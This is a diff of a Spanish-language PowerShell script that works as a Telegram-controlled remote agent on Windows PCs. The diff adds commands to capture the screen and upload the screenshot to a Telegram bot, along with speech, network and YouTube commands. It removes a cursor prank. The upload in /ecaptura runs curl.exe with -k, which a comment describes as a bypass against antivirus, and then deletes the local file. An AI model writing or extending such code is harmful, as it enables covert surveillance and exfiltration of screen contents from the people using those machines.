@@ -37,7 +37,7 @@ try {
 
 # --- NOTIFICAR A TELEGRAM QUE LA PC SE ENCENDIÓ ---
 try {
-    $MensajeInicio = " Ver 11 PC En Linea y Protegida: " + $User + "@" + $MiPC
+    $MensajeInicio = " Ver 22/07/26 PC En Linea y Protegida: " + $User + "@" + $MiPC
     [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $MensajeInicio })
 } catch {}
 
@@ -77,7 +77,7 @@ while ($true) {
 
                 # --- COMANDO GLOBAL: /lista ---
                 if ($Comando -eq "/lista") {
-                    $RespuestaLista = "ver 11 EQUIPO EN LINEA:`nID Numerico: [" + $MiIDNum + "] -> " + $User + "@" + $MiPC
+                    $RespuestaLista = "ver 22/07/26 EQUIPO EN LINEA:`nID Numerico: [" + $MiIDNum + "] -> " + $User + "@" + $MiPC
                     [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $RespuestaLista })
                     continue
                 }
@@ -89,9 +89,14 @@ while ($true) {
                                   "• /lista - Ver que numero de ID tomo cada PC.`n" +
                                   "• /ayuda - Ver este menu.`n`n" +
                                   "Comandos Individuales (Deja un espacio y pon el numero de la PC):`n" +
-                                  "• /pantalla_off [Numero]`n" +
-                                  "• /pantalla_on [Numero]`n" +
-                                  "• /notepad [Numero]`n`n" +
+                                  " /pantalla_off [Numero]`n" +
+                                  " /pantalla_on [Numero]`n" +
+                                  " /hablar [Numero]`n" +
+                                  " /captura [Numero]`n" +
+                                  " /ecaptura [Numero]`n" +
+                                  " /red [Numero]`n" +
+                                  " /youtube [Numero]`n" +                                  
+                                  " /notepad [Numero]`n`n" +
                                   "Ejemplo de uso: /notepad " + $MiIDNum
                     
                     [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda })
@@ -128,32 +133,7 @@ while ($true) {
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
                             continue
                         }                        
-                        "/cursor" {
-                            # 1. Cargamos la API de Windows para obligar al sistema a recargar el mouse
-                            $MethodDefinition = '[DllImport("user32.dll", EntryPoint="SystemParametersInfo")] public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);'
-                            $User32 = Add-Type -MemberDefinition $MethodDefinition -Name "User32Refrescar" -Namespace "Win32" -PassThru -ErrorAction SilentlyContinue
-
-                            # 2. AGRANDAR: Cambia la flecha normal por la flecha gigante nativa de Windows (arrow_rl.cur)
-                            Set-ItemProperty -Path "HKCU:\Control Panel\Cursors" -Name "Arrow" -Value "C:\Windows\Cursors\arrow_rl.cur" -Force
-                            [void]$User32::SystemParametersInfo(0x0057, 0, $null, 3) # Envía señal de actualización real
-
-                            # Notificar a Telegram
-                            $Respuesta1 = "Cursor agrandado de forma real en ID $MiIDNum. Esperando 1 minuto..."
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta1 })
-
-                            # 3. TIEMPO DE ESPERA: Lo dejamos 60 segundos (1 minuto) para que pruebes rápido
-                            Start-Sleep -Seconds 60
-
-                            # 4. RESTAURAR: Vuelve a poner la flecha estándar por defecto de Windows (arrow_l.cur)
-                            Set-ItemProperty -Path "HKCU:\Control Panel\Cursors" -Name "Arrow" -Value "C:\Windows\Cursors\arrow_l.cur" -Force
-                            [void]$User32::SystemParametersInfo(0x0057, 0, $null, 3) # Refresca para achicarlo
-
-                            # Notificar fin a Telegram
-                            $Respuesta2 = "Cursor restaurado automáticamente a tamaño normal en ID $MiIDNum"
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta2 })
-                            continue
-                        }
-
+                       
 
                         "/hablar" {
                             # 1. Creamos el objeto de control del sistema de Windows
@@ -207,43 +187,64 @@ while ($true) {
                             # 4. Destruye la memoria del proceso viejo de inmediato
                             Stop-Process -Id $PID -Force
                             continue
-                        }
-                        "/captura" {
-                            # 1. Definimos la ruta temporal donde se guardará la foto en el disco de la PC
-                            $RutaFoto = "$env:TEMP\screenshot.png"
-
+                        }                                             
+                                                                          "/captura" {
+                            $RutaFotoFija = "C:\ScriptCliente\screenshot.png"
                             try {
-                                # 2. Lógica interna de Windows para sacar una foto de la pantalla
-                                Add-Type -AssemblyName System.Windows.Forms
-                                Add-Type -AssemblyName System.Drawing
+                                # 1. Forzar la carga manual de las librerías gráficas de Windows
+                                [void][Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+                                [void][Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
                                 
-                                $Pantalla = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-                                $MapaBits = New-Object System.Drawing.Bitmap($Pantalla.Width, $Pantalla.Height)
-                                $Grafico  = [System.Drawing.Graphics]::FromImage($MapaBits)
+                                # 2. Motor gráfico nativo puro: Captura toda la pantalla
+                                $Bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                                $Bitmap = New-Object Drawing.Bitmap $Bounds.Width, $Bounds.Height
+                                $Graphics = [Drawing.Graphics]::FromImage($Bitmap)
+                                $Graphics.CopyFromScreen($Bounds.Location, [Drawing.Point]::Empty, $Bounds.Size)
                                 
-                                $Grafico.CopyFromScreen($Pantalla.X, $Pantalla.Y, 0, 0, $Pantalla.Size)
-                                $MapaBits.Save($RutaFoto, [System.Drawing.Imaging.ImageFormat]::Png)
+                                # 3. Guarda la imagen de forma física en tu carpeta
+                                $Bitmap.Save($RutaFotoFija, [System.Drawing.Imaging.ImageFormat]::Png)
                                 
-                                # Limpieza de memoria del sistema
-                                $Grafico.Dispose()
-                                $MapaBits.Dispose()
+                                # Liberar la memoria RAM del sistema
+                                $Graphics.Dispose()
+                                $Bitmap.Dispose()
 
-                                # 3. ENVÍO DEL ARCHIVO A TELEGRAM: Usamos Form-Data para meter la imagen real
-                                $Parámetros = @{
-                                    chat_id = $ChatID
-                                    photo   = Get-Item -LiteralPath $RutaFoto
-                                    caption = "📸 Captura de pantalla en vivo de ID $MiIDNum"
-                                }
-                                [void](Invoke-RestMethod -Uri "$URL/sendPhoto" -Method Post -Form $Parámetros)
-                                
-                                # Borramos el archivo temporal para no dejar basura en la PC
-                                Remove-Item $RutaFoto -Force
+                                # 4. Mandar texto de confirmación a Telegram
+                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Foto creada con exito en el disco de ID $MiIDNum" })
                             } catch {
-                                # Si falla (por ejemplo, si la PC está bloqueada y no hay pantalla gráfica activa)
-                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "❌ Error al tomar la captura en ID $MiIDNum. Puede que la pantalla esté bloqueada." })
+                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Error de hardware grafico local en ID $MiIDNum" })
                             }
                             continue
                         }
+
+                        "/ecaptura" {
+                            $RutaFotoFija = "C:\ScriptCliente\screenshot.png"
+                            try {
+                                # 1. Verificamos si la imagen creada existe en la carpeta
+                                if (Test-Path $RutaFotoFija) {
+                                    
+                                    # 2. Dirección de red oficial y exacta para subir fotos
+                                    $UrlFinalSend = $URL + "/sendPhoto"
+                                    
+                                    # 3. TRANSMISIÓN INYECTADA GANADORA: Usa curl nativo con el bypass -k contra el antivirus
+                                    & "curl.exe" -k -F "chat_id=$ChatID" -F "photo=@$RutaFotoFija" -F "caption=Captura exitosa de ID $MiIDNum" $UrlFinalSend
+                                    
+                                    # Le damos un segundo de tolerancia para asegurar la transmision completa
+                                    Start-Sleep -Seconds 1
+                                    
+                                    # 4. Limpiamos la carpeta borrando la foto enviada para mantener el disco ordenado
+                                    Remove-Item $RutaFotoFija -Force
+                                } else {
+                                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "No se encontro ninguna imagen para enviar en ID $MiIDNum. Usa /captura primero." })
+                                }
+                            } catch {
+                                $ErrorMensaje = $_.Exception.Message
+                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Fallo de envio: $ErrorMensaje en ID $MiIDNum" })
+                            }
+                            continue
+                        }
+
+
+
 
 
 
